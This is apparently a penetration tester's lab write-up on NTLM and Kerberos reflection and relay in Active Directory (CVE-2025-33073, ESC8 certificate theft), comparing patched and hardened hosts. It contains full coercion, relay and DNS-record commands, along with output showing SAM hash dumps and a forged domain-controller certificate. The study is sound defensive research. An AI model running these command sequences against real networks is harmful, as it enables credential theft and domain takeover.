---
layout: post
title: "Reflection and Relay, Tested: NTLM, Kerberos, and the Limits of Patching"
date: 2026-06-23 12:00:00 +0300
tags: [ntlm, kerberos, ntlm-relay, kerberos-relay, reflection, active-directory, adcs, esc8, coercion, petitpotam, cve-2025-33073, cve-2026-20929, krbrelayx, impacket, netexec, pentesting, red-team, windows]
---

CVE-2025-33073 brought authentication reflection back from the dead. It revived a bug class that had been considered solved since 2008, and for a few weeks in mid-2025 it was everywhere: a single malformed DNS record was enough to walk a domain-joined Windows box into handing over a SYSTEM shell, remotely, starting from a standard domain account. That part has been written about well already, and it has been patched for months.

This post is not the news. It's what I found when I sat down and _tested_ the thing properly, long after the patch shipped, because the interesting question was never "does the exploit work." It was "which defenses actually stop it, and which ones only look like they do." So I built a small lab and ran the same attack against three versions of the same host: unpatched, fully patched, and properly hardened. Then I did it again over Kerberos instead of NTLM, and again as a cross-protocol relay to AD CS. The results are not symmetrical, and the gaps between them are the whole point. A few of my early assumptions did not survive contact with the lab, which I'll flag as we go.

What you get out of this: a clear picture of what reflection and relay are, how the 2025 bug works under the hood, and then the part I actually care about, side-by-side evidence of what patching buys you, what configuration buys you, and the places where one fixes nothing and the other is all that saves you.

<!--more-->

**TL;DR.** CVE-2025-33073 made authentication reflection exploitable again in 2025. It is patched now, and this post is about which defenses actually stop reflection and relay, not about the exploit itself. I ran the same attack across unpatched, patched, and hardened hosts, over both NTLM and Kerberos, as on-host reflection and as a cross-protocol relay to AD CS, then reproduced the newer DNS CNAME variant on a fully patched box. The short version: patching closes specific paths but not the class, NTLM ESC8 survives the patch, and the CNAME route revives Kerberos ESC8 on a patched but unhardened CA, while the configuration controls (SMB signing for SMB, HTTPS plus EPA for AD CS Web Enrollment) are what actually held in every test. Where a result is reasoned rather than captured, I say so in the text.

**Contents**

- [A short history of relay and reflection](#a-short-history-of-relay-and-reflection)
- [How the 2025 revival actually works](#how-the-2025-revival-actually-works)
- [The CVEs you need to know](#the-cves-you-need-to-know)
- [EoP or RCE?](#eop-or-rce)
- [How Microsoft seems to treat this](#how-microsoft-seems-to-treat-this)
- [The patch-bypass arc](#the-patch-bypass-arc)
- [Exploitation: one attack, three defensive states](#exploitation-one-attack-three-defensive-states)
- [The CNAME variant, and what the latest patch does about it](#the-cname-variant-and-what-the-latest-patch-does-about-it)
- [Mitigation: config versus patch](#mitigation-config-versus-patch)
- [Detection and the blue-team view](#detection-and-the-blue-team-view)
- [Tools](#tools)

## A short history of relay and reflection

Reflection is a special case of NTLM relay, so let's start there. NTLM is challenge-response, and its core weakness is that the authentication isn't tied to the channel it travels over. Coerce someone into authenticating to a server you control, grab those messages, replay them to a _different_ server, and you're now that victim, no password required.

The messages ride inside whatever application protocol is carrying them (SMB, HTTP, LDAP, MSSQL), so you can relay across protocols too: catch an HTTP authentication, forward it over SMB. That flexibility is most of what makes relay such a durable problem in Active Directory.

Reflection aims the same trick at the machine the authentication came from. If the box trusts its own incoming authentication and the identity you bounced back is privileged, you escalate right there on the host.

Microsoft shut the classic SMB-to-SMB version in 2008, and every variant since got the same one-off treatment:

- **MS08-068 (2008):** the original, blocking SMB-to-SMB reflection.
- **MS09-013 (2009):** HTTP-to-SMB reflection.
- **MS15-076 (2015):** DCOM-to-DCOM reflection.
- **LocalPotato / CVE-2023-21746:** local DCOM-to-SMB context swapping for SYSTEM.

Each fix closed exactly one door, which is why "reflection is dead" was always a bit optimistic. It was dead through the paths people had thought to check.

## How the 2025 revival actually works

CVE-2025-33073 came out in June 2025 from [RedTeam Pentesting](https://blog.redteam-pentesting.de/2025/reflective-kerberos-relay-attack/) and [Synacktiv](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025). The root cause is the kind of thing you read twice: two pieces of code inside LSASS look at the same target name and disagree about what it says.

Coerce a host to authenticate to a name like `srv1<marshalled-blob>` and that hostname is carrying a chunk of hidden "marshalled target info" tacked on after the real name. It's a documented format, originally meant for steering Kerberos auth toward a specific IP. As the request moves through LSASS, two functions parse it and reach opposite conclusions.

![CVE-2025-33073 root cause: the two LSASS functions disagree about the target name](/assets/img/diagram-1.png)

_The two-function parsing mismatch behind CVE-2025-33073._

The `LsapCheckMarshalledTargetInfo` function strips the marshalled blob off and is left holding a bare `srv1`. `SspIsTargetLocalhost` then compares that stripped name to the machine's own hostname, sees a match, and decides the box is talking to itself. At that point Windows flips into **local NTLM authentication**.

Local NTLM auth exists for a sensible reason: if client and server are the same machine, why bother with a full challenge-response? The server tells the client to skip it and just copies the caller's token straight into the server context, all inside the one `lsass.exe` process. Now think about who the coerced caller is. It's a SYSTEM service, `lsass.exe` itself. So the token that gets copied over is a SYSTEM token. Relay the exchange back and the reflected session lands as SYSTEM.

There's a nice flourish the researchers added: a record that starts with `localhost` and then the marshalled suffix works against _anything_. Strip the suffix and you're left with `localhost`, which passes the local check no matter what the box is actually called. One record, every vulnerable host. It's the record I use throughout the lab below.

And it isn't only an NTLM problem, which matters more than it first appears. The same coercion lands over Kerberos through a completely different code path: SYSTEM builds the Kerberos request, caches its token in a global list, and the receiving side rebuilds a SYSTEM token when the cached subkey matches. NTLM or Kerberos, you end up in the same place. Remember that, because it comes back when we get to patching.

## The CVEs you need to know

|CVE|Year|Component|What it is|
|---|---|---|---|
|CVE-2008-4037 (MS08-068)|2008|SMB|Original SMB-to-SMB reflection|
|CVE-2019-1040 ("Drop the MIC")|2019|NTLM|Strips message integrity, enabling cross-protocol relay|
|CVE-2021-36942 (PetitPotam)|2021|EFSRPC|Coercion vector relayed to AD CS|
|CVE-2023-21746 (LocalPotato)|2023|DCOM/SMB|Local context-swap reflection for SYSTEM|
|CVE-2023-23397|2023|Outlook|Coercion vector relayed to Exchange|
|CVE-2025-33073|2025|SMB client (`mrxsmb.sys`)|Marshalled-DNS reflection to remote SYSTEM|
|CVE-2025-58726|2025|SMB server (`SRV2.SYS`)|SMB server-side fix for Ghost SPN Kerberos reflection|
|CVE-2026-20929|2026|HTTP.sys|Backports CBT support into HTTP.sys for HTTP relay; protection still depends on TLS and channel-binding enforcement|

## EoP or RCE?

Microsoft tagged CVE-2025-33073 as elevation of privilege. The researchers who found it disagreed, and for what it's worth, I think they have the better argument.

The EoP label isn't wrong, exactly. The end state is a SYSTEM token, and you need valid domain credentials to start, and both of those read as "privilege escalation." But the way it actually plays out is remote code execution. You don't need a foothold on the target at all. Any domain user's creds plus network access, and you coerce a box you've never touched and reflect your way to SYSTEM on it. Calling that local escalation undersells what you can do with it on day one of an engagement.

Either label is technically defensible, and honestly the argument matters less than the mental model behind it: reflection and relay are a primitive, not a result. What you walk away with depends entirely on what you wire it up to.

![Source, relay target, and outcome: reflect to self, relay to AD CS, relay to LDAP](/assets/img/diagram-2.png)

_What you walk away with depends on where you point the relay._

Bounce the auth back to the same host and you're capped at that host: local SYSTEM, or remote SYSTEM if you launched it from across the network. But relay it cross-protocol to a domain service and the blast radius changes completely. Coerce a domain controller, relay to AD CS web enrollment, and you've minted a certificate for the DC's machine account. That's the whole domain. Relay to LDAP, grant yourself DCSync rights, dump every hash. Same technique each time. The only thing that changes is the target, and the target is what decides whether you own one workstation or the forest. I tested both ends of that range in the lab, and you'll see the cross-protocol version land a DC certificate further down.

## How Microsoft seems to treat this

I want to be careful here, because I can't speak for Microsoft's intent, only for how their guidance and their patches read in practice. And in practice, relay gets treated more like a configuration problem than a bug class to be stamped out in code. The public guidance leans on hardening (SMB signing, EPA, channel binding) rather than promising to close every path, and that lines up with CVE-2025-33073 landing as an EoP rather than something scarier, and with the official advice being some version of "harden your environment."

The longer arc is NTLM being phased out in favour of Kerberos and modern auth, and the platform defaults have been drifting toward safer settings (the tightening of SMB signing requirements in current Windows 11 and Server 2025 defaults is the clearest example, with the inbound-versus-outbound caveat I get into later). Read together, the pattern I take from it is this: individual paths will keep getting patched, but the protection that actually holds is configuration, and eventually not running NTLM at all. That's my reading, not a Microsoft statement.

## The patch-bypass arc

The June 2025 patch wasn't the end of the story, and the rest of it is the better lesson. That first fix was client-side: a check in the SMB client (`mrxsmb`) that rejects target names carrying marshalled target info. It killed the specific DNS-record technique, but it was narrow, and the researchers said out loud that they expected it to be bypassable.

They were right, and the bypass came from a different direction than the original bug. [Andrea Pierini](https://x.com/decoder_it) at Semperis showed the client-side check did nothing against a Kerberos variant he named the [Ghost SPN attack](https://www.semperis.com/blog/exploiting-ghost-spns-and-kerberos-reflection-for-smb-server-privilege-elevation/): find a service principal name on the target that points at a hostname which no longer resolves in DNS, register that name to your own IP, coerce the target into requesting a ticket for it, and the reflection works again, straight to SYSTEM. Microsoft fixed that one in October 2025 as CVE-2025-58726, a server-side change in `SRV2.SYS` that checks the connection is actually local before allowing the reflected session. [Decoder](https://decoder.cloud/2025/11/24/reflecting-your-authentication-when-windows-ends-up-talking-to-itself/) covered the same Ghost SPN ground in detail, and Synacktiv kept the run going in their ["Part 2" research](https://www.synacktiv.com/en/publications/bypassing-windows-authentication-reflection-mitigations-for-system-shells-part) with yet another coercion primitive that bypassed the original patch.

The pattern by now should be familiar: patch one primitive, a new one turns up, and the SMB reflection path only really gets harder once the check moves to the server side.

A client-side check bought some time. A server-side check did the actual job.

And there's one more chapter that reframes everything above. The marshalled-name trick was only ever _one_ way to coerce a victim into requesting auth for a target you can use. Late in 2025, [Cymulate](https://cymulate.com/blog/kerberos-authentication-relay-via-cname-abuse/) showed that Windows Kerberos clients follow DNS CNAME records when they build SPNs for ticket requests, which lets you coerce a ticket for an SPN of your choosing without the marshalled blob at all. Microsoft's January 2026 answer (CVE-2026-20929) didn't touch the coercion side; it backported channel-binding support into HTTP.sys, hardening the target. So the pattern repeats: patch the primitive, the attack moves to a new primitive, and the defense keeps migrating toward the service being attacked. Which, not coincidentally, is exactly the argument for hardening targets instead of waiting on CVEs.

## Exploitation: one attack, three defensive states

Here's the part I actually care about. The cleanest way to understand what a given defense does is to run the _same_ attack against three versions of the same host and see where it falls over. Everything attacker-side runs from a Linux box at `192.168.1.23`, shown with the prompt `melid@hellforge`. Windows-side commands (the hardening in State 3) run in an elevated PowerShell on the relevant server and are shown without that prompt.

Lab cast: `ref-dc` (DC and DNS, `192.168.1.24`), `ref-member` (the reflection target, `192.168.1.25`), `ref-adcs` (Enterprise CA with HTTP web enrollment, `192.168.1.27`), and the attacker at `192.168.1.23`. The low-priv domain user is `lowpriv` with password `P@ssw0rd!`.

One of these boxes needs a quick word before we start, because half the post relies on it. AD CS is Active Directory Certificate Services, Microsoft's built-in PKI. The piece that matters here is the Web Enrollment role: a small web app at `http://<ca>/certsrv/` where a client can request a certificate over HTTP using its Windows credentials. In a default install that endpoint speaks plain HTTP and accepts NTLM and Kerberos, which makes it a perfect relay target. If I can make a privileged account authenticate to it, I can request a certificate _as that account_. This is the attack that is called ESC8. The dangerous version: coerce a domain controller, relay its authentication to the CA, and walk away with a certificate for the DC's own machine account, which is as good as owning the domain. Keep that endpoint in mind; it's the second half of every relay test below.

If you plan to replay the lab, the State 3 hardening is collected here so you can stand it up in one pass; both pieces also appear in context in State 3 below, where the attacks meet them. SMB signing goes on the reflection target, the HTTPS-plus-EPA block on the CA.

```powershell
# ref-member: require inbound (server-side) SMB signing
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
```

```powershell
# ref-adcs: require HTTPS, then add Extended Protection, on the enrollment vdir
$cert = New-SelfSignedCertificate -DnsName ref-adcs.ref.htb -CertStoreLocation Cert:\LocalMachine\My -KeyExportPolicy Exportable -NotAfter (Get-Date).AddYears(2)
New-WebBinding -Name "Default Web Site" -Protocol https -Port 443 -IPAddress "*"
(Get-WebBinding -Name "Default Web Site" -Protocol https).AddSslCertificate($cert.Thumbprint, "My")
& "$env:windir\system32\inetsrv\appcmd.exe" set config "Default Web Site/CertSrv" /section:access /sslFlags:Ssl /commit:apphost
& "$env:windir\system32\inetsrv\appcmd.exe" set config "Default Web Site/CertSrv" /section:windowsAuthentication /extendedProtection.tokenChecking:Require /extendedProtection.flags:None /commit:apphost
iisreset
```

Each scenario runs two paths. Path A is pure reflection against the member, which gets you local SYSTEM. Path B is the cross-protocol relay: coerce the DC, relay to AD CS, get a certificate for the DC account. Both need two terminals on the attacker box, a relay listener and a coercion trigger.

The underlying bug, the marshalled target-name parsing mismatch, is not specific to either authentication protocol; it sits below both and shows up over NTLM and over Kerberos alike. So alongside the NTLM runs in each state, every state below also gets a Kerberos pass, swapping `ntlmrelayx` for `krbrelayx`. A quick word on Kerberos for anyone who lives mostly in NTLM-relay land. Instead of the challenge-response NTLM uses, Kerberos has the client ask a domain controller for a service ticket aimed at a specific service principal name (an SPN, like `cifs/ref-member`), then present that ticket to the service. Relay and reflection still work the same way in spirit, coerce a victim into authenticating and forward its ticket, but with one extra constraint: a Kerberos ticket is cryptographically bound to the SPN it was requested for, so whatever service you relay it to has to match that SPN. That one constraint is why the marshalled-name trick matters even more here, and why the relay tooling is fussier about names.

Two setup notes for the Kerberos side. First, a one-time edit to force Kerberos-only by not advertising NTLMSSP: in `krbrelayx/lib/servers/smbrelayserver.py` (around lines 157 to 159), drop the `NTLMSSP` mechType from the advertised list, leaving only the two Kerberos ones. Second, the mechanics differ from NTLM in three ways that bite if you miss them: `krbrelayx` targets must be hostnames, never IPs (Kerberos needs an SPN, so `smb://ref-member`, not `smb://192.168.1.25`); the attacking machine has to resolve the lab names, so the FQDNs go in `/etc/hosts`; and Kerberos is clock-sensitive, so sync against the DC if you ever see `KRB_AP_ERR_SKEW`. One detail that cost me a chunk of time, covered in the ESC8 run below: the marshalled DNS record's prefix has to be the *relay target's* name, because that prefix becomes the SPN the victim requests. For reflection that is the victim itself (`ref-member`); for the cross-protocol ESC8 relay it is the CA (`ref-adcs`), not the coerced DC.

One note before the Kerberos blocks: this time I captured the Kerberos runs across all three states, unpatched, patched, and hardened, so the output below is real rather than reasoned. The single exception is hardened *reflection* (SMB signing) over Kerberos, which I reason from where signing sits in the stack rather than a separate capture, and I flag it where it comes up.

### State 1: Unpatched, default config

Every path I tested works, which is the boring part. First the universal marshalled DNS record goes in once, written as the low-priv user. The record's host part stays the literal marshalled blob; only its data points at the attacker:

```bash
melid@hellforge$ python3 dnstool.py -u 'REF\lowpriv' -p 'P@ssw0rd!' --action add --record 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' --data 192.168.1.23 -dns-ip 192.168.1.24 ref-dc.ref.htb
```

**Path A, reflection to local SYSTEM.** Terminal 1, the relay listener, reflecting straight back at the member over SMB:

```bash
melid@hellforge$ impacket-ntlmrelayx -t smb://ref-member.ref.htb -smb2support --no-http-server
```

Terminal 2, coerce the member into authenticating to the marshalled name:

```bash
melid@hellforge$ nxc smb ref-member -u lowpriv -p 'P@ssw0rd!' -M coerce_plus -o METHOD=PetitPotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

```
SMB         192.168.1.25  445  REF-MEMBER  [*] Windows Server 2022 Build 20348 (name:REF-MEMBER) (domain:ref.htb) (signing:False) (SMBv1:None)
SMB         192.168.1.25  445  REF-MEMBER  [+] ref.htb\lowpriv:P@ssw0rd!
COERCE_PLUS 192.168.1.25  445  REF-MEMBER  VULNERABLE, PetitPotam
COERCE_PLUS 192.168.1.25  445  REF-MEMBER  Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

Note `signing:False` in that banner. That is the precondition the whole reflection rests on. Back in Terminal 1, the relayed session authenticates and dumps the local SAM:

```
[*] Servers started, waiting for connections
[*] (SMB): Received connection from 192.168.1.25, attacking target smb://ref-member.ref.htb
[*] (SMB): Authenticating connection from /@192.168.1.25 against smb://ref-member.ref.htb SUCCEED [1]
[*] smb:///@ref-member.ref.htb [1] -> Starting service RemoteRegistry
[*] smb:///@ref-member.ref.htb [1] -> Target system bootKey: 0xa2a669826d80c00a3f703d66f1e42d96
[*] smb:///@ref-member.ref.htb [1] -> Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d23a9ea34d6106ac3fb97bc9edad55e6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:b48aa8ec00d62b2ae6585c109f2fab74:::
[*] smb:///@ref-member.ref.htb [1] -> Done dumping SAM hashes for host: ref-member.ref.htb
```

SYSTEM on the box, local Administrator hash in hand. The auth arrives as the blank/local context, which is the reflected SYSTEM token doing its thing.

**Path B, coerce the DC, relay to AD CS.** Terminal 1, relay to the CA's web enrollment instead:

```bash
melid@hellforge$ impacket-ntlmrelayx -t http://ref-adcs.ref.htb/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

Terminal 2, coerce the DC. The listener here is the attacker IP, not the marshalled record, because this is a plain relay out, not a reflection:

```bash
melid@hellforge$ nxc smb ref-dc -u lowpriv -p 'P@ssw0rd!' -M coerce_plus -o METHOD=PetitPotam LISTENER=192.168.1.23
```

```
SMB         192.168.1.24  445  REF-DC  [*] Windows Server 2022 Build 20348 x64 (name:REF-DC) (domain:ref.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.1.24  445  REF-DC  [+] ref.htb\lowpriv:P@ssw0rd!
COERCE_PLUS 192.168.1.24  445  REF-DC  VULNERABLE, PetitPotam
COERCE_PLUS 192.168.1.24  445  REF-DC  Exploit Success, efsrpc\EfsRpcAddUsersToFile
```

Notice the DC reports `signing:True`, where the member was `False`. That is the default difference between a DC and a member server, and it is exactly why you can relay the DC's auth elsewhere but cannot reflect it back at the DC itself. Terminal 1 issues the certificate:

```
[*] (SMB): Authenticating connection from REF/REF-DC$@192.168.1.24 against http://ref-adcs.ref.htb SUCCEED [1]
[*] http://REF/REF-DC$@ref-adcs.ref.htb [2] -> Generating CSR...
[*] http://REF/REF-DC$@ref-adcs.ref.htb [2] -> CSR generated!
[*] http://REF/REF-DC$@ref-adcs.ref.htb [2] -> Getting certificate...
[*] http://REF/REF-DC$@ref-adcs.ref.htb [2] -> GOT CERTIFICATE! ID 5
[*] http://REF/REF-DC$@ref-adcs.ref.htb [2] -> Writing PKCS#12 certificate to ./REF-DC.pfx
```

`REF-DC.pfx` on disk is the win. That is a certificate for the domain controller's own machine account, and from there the standard path is PKINIT to a TGT, then the DC's NT hash, then DCSync of `krbtgt`. The certificate is the compromise; everything after it is spending a credential you already stole.

> **Two fresh-CA gotchas that cost me time.** A brand-new Enterprise CA does not always issue cleanly on the first request. My first relays reached `Generating CSR... CSR generated! Getting certificate...` and then died with `Error obtaining certificate!`, which looks like a broken attack but is really the CA not having settled. The fix was `certutil -pulse` followed by `Restart-Service CertSvc` on `ref-adcs`, then retry. Separately, when I tried to finish the chain with `certipy-ad auth` to do PKINIT, it returned `KDC_ERR_PADATA_TYPE_NOSUPP`, because this freshly built CA had never issued the DC its own Kerberos cert (`Get-ChildItem Cert:\LocalMachine\My` on the DC came back empty), so the KDC literally could not do certificate logon yet. On a real, established domain the DC already holds that cert and PKINIT-to-DCSync is immediate. In the lab it is a provisioning artifact, not anything about the vulnerability, which is why I treat the PFX as the proof and stop there.

**Over Kerberos.** Same attack, `krbrelayx` instead of `ntlmrelayx`. Reflection first (Terminal 1 the listener, Terminal 2 the coercion):

```bash
melid@hellforge$ python3 dnstool.py -u 'REF\lowpriv' -p 'P@ssw0rd!' --action add --record 'ref-member1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' --data 192.168.1.23 -dns-ip 192.168.1.24 ref-dc.ref.htb
melid@hellforge$ python3 krbrelayx.py -t smb://ref-member -debug
melid@hellforge$ nxc smb ref-member -u lowpriv -p 'P@ssw0rd!' -M coerce_plus -o METHOD=PetitPotam LISTENER=ref-member1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
```

krbrelayx runs in `kerberos relay mode because no credentials were specified`, which confirms it is genuinely the Kerberos path and not NTLM falling through. The reflected ticket lands and dumps the SAM:

```
[*] SMBD: Received connection from 192.168.1.25
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xa2a669826d80c00a3f703d66f1e42d96
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d23a9ea34d6106ac3fb97bc9edad55e6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:b48aa8ec00d62b2ae6585c109f2fab74:::
[*] Done dumping SAM hashes for host: ref-member
```

Same `bootKey` and Administrator hash as the NTLM path, reached over Kerberos. Now ESC8 over Kerberos, and here is the prefix detail I mentioned. The marshalled record is prefixed with `ref-adcs`, the relay target, not `ref-dc`, the coerced victim. Get that wrong and `krbrelayx` receives the ticket but rejects it with `No target configured that matches the hostname of the SPN in the ticket`, because the DC built a ticket for the wrong SPN. With the `ref-adcs` prefix:

```bash
melid@hellforge$ python3 dnstool.py -u 'REF\lowpriv' -p 'P@ssw0rd!' --action add --record 'ref-adcs1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' --data 192.168.1.23 -dns-ip 192.168.1.24 ref-dc.ref.htb
melid@hellforge$ python3 krbrelayx.py -t http://ref-adcs.ref.htb/certsrv/ --adcs --template DomainController -v 'REF-DC$' -debug
melid@hellforge$ nxc smb ref-dc -u lowpriv -p 'P@ssw0rd!' -M coerce_plus -o METHOD=PetitPotam LISTENER=ref-adcs1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
```

```
[*] SMBD: Received connection from 192.168.1.24
[*] HTTP server returned status code 200, treating as a successful login
[*] Generating CSR...
[*] GOT CERTIFICATE! ID 3
[*] Writing PKCS#12 certificate to ./REF-DC.pfx
```

The DC builds a ticket for `cifs/ref-adcs`, connects to the listener, `krbrelayx` matches the SPN to its target and relays the AP-REQ to web enrollment, and the CA issues a cert for `REF-DC$`. The Kerberos twin of the NTLM ESC8, certificate and all.

### State 2: Fully patched, same config

All three boxes patched to the current cumulative (Jun 2026), well past the June 2025 `mrxsmb` fix, nothing else changed. Same commands, and the two paths now behave nothing alike.

**Path A, reflection: blocked.** Run the exact same coercion at the marshalled name with the SMB listener up, and Terminal 1 never even gets a connection:

```
[*] Servers started, waiting for connections
```

That is the whole output. The coercion still fires (`nxc` reports `Exploit Success` as before), but the patched `mrxsmb` refuses to authenticate to the marshalled target, so nothing comes back to the listener. To prove that silence is the patch and not a broken setup, point the same coercion at a _plain_ listener name instead of the marshalled record:

```bash
melid@hellforge$ nxc smb ref-member -u lowpriv -p 'P@ssw0rd!' -M coerce_plus -o METHOD=PetitPotam LISTENER=192.168.1.23
```

Now the member does call back, and you can watch it fail at authentication:

```
[*] (SMB): Received connection from 192.168.1.25, attacking target smb://ref-member.ref.htb
[-] (SMB): Authenticating against smb://ref-member.ref.htb as REF/REF-MEMBER$ FAILED
```

This is the detail that surprised me, and it is sharper than "it went quiet." Post-patch the reflection no longer produces a privileged local-auth context. The marshalled name gets refused outright (no callback at all), and even a plain coercion only yields the machine account `REF-MEMBER$` authenticating to itself over the network, which the box rejects. Either way there is no SYSTEM token, where the unpatched run handed over the full SAM. The member is still `signing:False` here, so this is the patch doing the work, not signing.

**Path B, ESC8: still works.** The relay to AD CS is untouched by the patch, because ESC8 is a configuration weakness, not the code bug that got fixed. Same two commands as State 1 Path B, and:

```
[*] (SMB): Authenticating connection from REF/REF-DC$@192.168.1.24 against http://ref-adcs.ref.htb SUCCEED [1]
[*] http://REF/REF-DC$@ref-adcs.ref.htb [2] -> GOT CERTIFICATE! ID 3
[*] http://REF/REF-DC$@ref-adcs.ref.htb [2] -> Writing PKCS#12 certificate to ./REF-DC.pfx
```

A fully patched DC that flatly refuses to reflect will still hand you a certificate for its own machine account over NTLM relay. Sit with that for a second, because it is the whole point of the post: the patch and the config flaw are independent, and patching the reflection does nothing for the relay.

**Over Kerberos: also dead, and this is the run I actually cared about.** The question was whether the June patch covers the Kerberos path or just NTLM. It covers it. Reflection first:

```bash
melid@hellforge$ python3 krbrelayx.py -t smb://ref-member -debug
melid@hellforge$ nxc smb ref-member -u lowpriv -p 'P@ssw0rd!' -M coerce_plus -o METHOD=PetitPotam LISTENER=ref-member1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
```

Every EFSRPC method returns `ERROR_BAD_NETPATH` and `krbrelayx` receives nothing. The patched `mrxsmb` rejects the marshalled target name before any outbound auth is generated, so the protocol riding on top makes no difference. Same early failure point as the patched NTLM reflection.

ESC8 over Kerberos, using the correct `ref-adcs` prefix that worked unpatched:

```bash
melid@hellforge$ python3 krbrelayx.py -t http://ref-adcs.ref.htb/certsrv/ --adcs --template DomainController -v 'REF-DC$' -debug
melid@hellforge$ nxc smb ref-dc -u lowpriv -p 'P@ssw0rd!' -M coerce_plus -o METHOD=PetitPotam LISTENER=ref-adcs1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
```

`nxc` reports `Exploit Success`, but `krbrelayx` stays silent: no connection, no ticket, nothing. The DC never builds the `cifs/ref-adcs` ticket because the marshalled primitive that produces it is exactly what the patch refuses. So the marshalled-name Kerberos ESC8 path is off the table on a patched box, and this is the sharp asymmetry worth sitting with: the patch kills the marshalled-name Kerberos route but not NTLM ESC8. NTLM relay does not need the marshalled trick, just any coerced authentication to forward, so the patched DC still gets a cert over NTLM (State 2 Path B above). The Kerberos route here specifically depends on the marshalled name to obtain a relayable ticket, and that is the patched primitive. Same target, same CA, opposite outcome, decided entirely by which authentication protocol the relay rides. One caveat I will make good on later: the marshalled name is not the only way to get a Kerberos ticket for the CA. The CNAME technique further down revives Kerberos ESC8 on a fully patched box by a completely different route, so "patched kills Kerberos ESC8" is true only for this primitive, not for Kerberos relay in general.

### State 3: Patched and hardened

Now the controls. I tested these on the patched boxes, but it is worth saying plainly: they are patch-independent. SMB signing and the AD CS hardening live in the SMB server and in IIS, neither of which the reflection patch touches, so they produce the same result whether the host is patched or not. For NTLM, the patched output is below. For the Kerberos AD CS hardening check, I also used an unpatched host, so the relayed request could actually reach IIS and exercise the endpoint controls directly rather than dying earlier at the patched marshalled-name step.

**SMB signing kills the reflection.** The control that matters for relay is *inbound* (server-side) signing on the target, since the box receiving the reflected session is acting as an SMB server. On `ref-member`, in an elevated PowerShell:

```powershell
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
```

Re-run Path A exactly as before (marshalled record, SMB listener, coerce the member). The `nxc` banner now reads `signing:True`, and Terminal 1 shows:

```
[*] (SMB): Received connection from 192.168.1.25, attacking target smb://ref-member.ref.htb
[-] Signing is required, attack won't work unless using -remove-target / --remove-mic
[*] (SMB): Authenticating connection from /@192.168.1.25 against smb://ref-member.ref.htb SUCCEED [1]
[-] smb:///@ref-member.ref.htb [1] -> SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED
```

Read that carefully. The auth itself _succeeds_; what fails is the box accepting the unsigned session, which dies with `STATUS_ACCESS_DENIED`. Signing does not stop the relay reaching the host or the credential being valid, it stops the host honouring an unsigned session. And no, the `--remove-mic` hint is a red herring here: that downgrade (CVE-2019-1040) only helps when signing is negotiated but not required. Against a target that _requires_ it, the session still gets denied.

**AD CS: require HTTPS, then add EPA.** On `ref-adcs`, first stand up an HTTPS binding (a self-signed cert is fine for this, ntlmrelayx does not validate the chain), then require SSL on the enrollment vdir:

```powershell
$cert = New-SelfSignedCertificate -DnsName ref-adcs.ref.htb -CertStoreLocation Cert:\LocalMachine\My -KeyExportPolicy Exportable -NotAfter (Get-Date).AddYears(2)
New-WebBinding -Name "Default Web Site" -Protocol https -Port 443 -IPAddress "*"
(Get-WebBinding -Name "Default Web Site" -Protocol https).AddSslCertificate($cert.Thumbprint, "My")
& "$env:windir\system32\inetsrv\appcmd.exe" set config "Default Web Site/CertSrv" /section:access /sslFlags:Ssl /commit:apphost
iisreset
```

(The IIS config provider locks the `access` section by default, which is why this uses `appcmd ... /commit:apphost` rather than `Set-WebConfigurationProperty`, the latter throws a "section is locked at a parent level" error.)

From the attacker, the endpoint now refuses plain HTTP and answers only over TLS:

```bash
melid@hellforge$ curl -s -o /dev/null -w "HTTP:%{http_code}\n" http://ref-adcs.ref.htb/certsrv/certfnsh.asp
HTTP:403
melid@hellforge$ curl -sk -o /dev/null -w "HTTPS:%{http_code}\n" https://ref-adcs.ref.htb/certsrv/certfnsh.asp
HTTPS:401
```

Relaying the coerced DC to plain HTTP now produces no certificate. ntlmrelayx misreads the `403` and pushes on noisily, but no PFX is ever written:

```
[*] Status code returned: 403. Authentication does not seem required for URL
[*] HTTP server returned error code 403, treating as a successful login
[*] http://REF/REF-DC$@ref-adcs.ref.htb [2] -> Generating CSR...
[*] http://REF/REF-DC$@ref-adcs.ref.htb [2] -> Getting certificate...
[-] http://REF/REF-DC$@ref-adcs.ref.htb [2] -> Error getting certificate! Make sure you have entered valid certificate template.
```

Watch out for that `treating as a successful login` line. It is a lie. Judge the result by whether a certificate landed, never by the status line. The clean evidence here is the `HTTP:403` from `curl` plus the absence of any PFX.

Now add Extended Protection so even relaying to the HTTPS endpoint fails:

```powershell
& "$env:windir\system32\inetsrv\appcmd.exe" set config "Default Web Site/CertSrv" /section:windowsAuthentication /extendedProtection.tokenChecking:Require /extendedProtection.flags:None /commit:apphost
iisreset
```

